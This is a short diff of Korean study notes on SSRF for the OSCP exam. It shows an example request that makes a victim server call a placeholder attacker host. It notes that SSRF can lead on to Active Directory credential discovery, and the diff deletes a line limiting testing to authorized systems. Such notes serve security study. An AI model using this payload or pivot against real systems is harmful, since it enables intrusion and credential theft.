@@ -40,4 +40,3 @@ http://VICTIM_IP:8087/download?server=ATTACKER_IP_ADDRESS&id=75482342
 
 - SSRF로 내부 DB나 파일시스템에 접근하면, 이후 AD 크리덴셜 탐색이 쉬워진다.
 - OSCP 시험의 웹 공격 단계에서 자주 나오는 빈출이다.
-- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
